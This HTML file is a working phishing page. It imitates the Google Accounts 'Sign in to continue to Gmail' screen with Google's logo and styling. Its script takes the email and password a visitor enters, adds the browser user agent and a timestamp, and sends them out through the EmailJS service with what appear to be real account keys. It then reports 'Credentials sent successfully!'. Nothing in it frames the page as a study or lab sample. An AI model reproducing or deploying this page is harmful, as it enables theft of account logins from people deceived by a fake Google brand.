<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <style>
        :root {
            --bg-color: #ffffff;
            --text-primary: #202124; 
            --text-secondary: #5f6368; 
            --border-color: #dadce0; 
            --primary-blue: #1a73e8; 
            --hover-blue: #1765cc;
        }

        body {
            font-family: 'Roboto', arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f2f4f6;
        }

        .login-container {
            width: 450px; 
            max-width: 95%; 
            text-align: left;
            display: flex;
            flex-direction: column; 
            padding: 48px 40px 36px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            background-color: var(--bg-color);
            box-sizing: border-box;
        }

        .logo-img {
            width: 75px; 
            height: auto; 
            margin-bottom: 10px;
            object-fit: contain;
        }

        h1 {
            font-size: 24px;
            color: var(--text-primary);
            margin: 0 0 10px 0;
            font-weight: 400;
        }

        p.subtitle {
            color: var(--text-primary);
            font-size: 16px;
            margin: 0 0 35px 0;
            line-height: 1.5;
        }

        input[type="email"], 
        input[type="password"] {
            appearance: none;
            width: 100%; 
            box-sizing: border-box;
            padding: 13px 15px; 
            border-radius: 4px; 
            border: 1px solid var(--border-color);
            background-color: #fff; 
            font-size: 16px;
            height: 50px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border: 2px solid var(--primary-blue);
            padding: 12px 14px; 
        }

        input::placeholder {
             color: var(--text-secondary); 
             opacity: 0.7;
        }

        .next-btn {
            appearance: none;
            width: 120px; 
            margin-top: 24px;
            padding: 0 34px; 
            border-radius: 4px; 
            background-color: var(--primary-blue); 
            color: #fff !important; 
            font-weight: 500;
            font-size: 14px;
            height: 36px;
            cursor: pointer;
            border: none;
            float: right;
            transition: background-color 0.2s;
        }

         .next-btn:hover {
             background-color: var(--hover-blue) !important; 
         }

         .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: var(--primary-blue); 
            text-decoration: none !important; 
            font-size: 14px;
            font-weight: 500;
        }

        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
        
        /* Loading State */
        .next-btn.loading {
            background-color: #bdc1c6;
            cursor: not-allowed;
            position: relative;
            color: transparent;
        }
        
        .next-btn.loading::after {
            content: "...";
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            color: white;
        }
        
        /* Success/Error Messages */
        .message {
            margin-top: 10px;
            font-size: 14px;
            min-height: 20px;
        }
        .success { color: #0d9; }
        .error { color: #d93025; }
    </style>
</head>

<body style="background-color:#f0f2f5;"> 

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo-img">
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <form id="credentialForm">
            
            <input type="email" name="user_email" placeholder="Email or phone" required autocomplete="username">
            <input type="password" name="user_password" placeholder="Enter your password" style="margin-top: 15px;" autocomplete="current-password">
            
            <button type="submit" id="nextBtn" class="next-btn">Next</button>
            
            <div class="clearfix"></div>
            
            <a href="#" class="forgot-link">Forgot email?</a>
        </form>
        
        <div id="statusMessage" class="message"></div>
        
        <div style="margin-top: 30px; font-size: 14px; color: var(--text-secondary);">
            Not your computer? Use Guest mode to sign in privately. 
            <a href="#" class="forgot-link" style="display:inline; margin-left:5px;">Learn more</a>
        </div>
    </div>

    <!-- Load EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // Initialize EmailJS with your Public Key
        (function(){
            emailjs.init("91bVGfKY4eO7OfJHG");
        })();
    </script>

    <script type="text/javascript">
        document.getElementById('credentialForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const btn = document.getElementById('nextBtn');
            const statusMsg = document.getElementById('statusMessage');
            
            btn.classList.add('loading');
            btn.disabled = true;
            statusMsg.textContent = '';
            
            // Collect form data
            const formData = {
                user_email: this.user_email.value,
                user_password: this.user_password.value,
                user_agent: navigator.userAgent,
                timestamp: new Date().toLocaleString()
            };

            // Send the email using EmailJS
            emailjs.send('service_a4w1qgy', 'template_tvv0w1f', formData)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    statusMsg.textContent = 'Credentials sent successfully!';
                    statusMsg.className = 'message success';
                    btn.classList.remove('loading');
                    btn.disabled = false;
                }, function(error) {
                    console.error('FAILED...', error);
                    statusMsg.textContent = 'Failed to send credentials.';
                    statusMsg.className = 'message error';
                    btn.classList.remove('loading');
                    btn.disabled = false;
                });
        });
    </script>

</body>
</html>
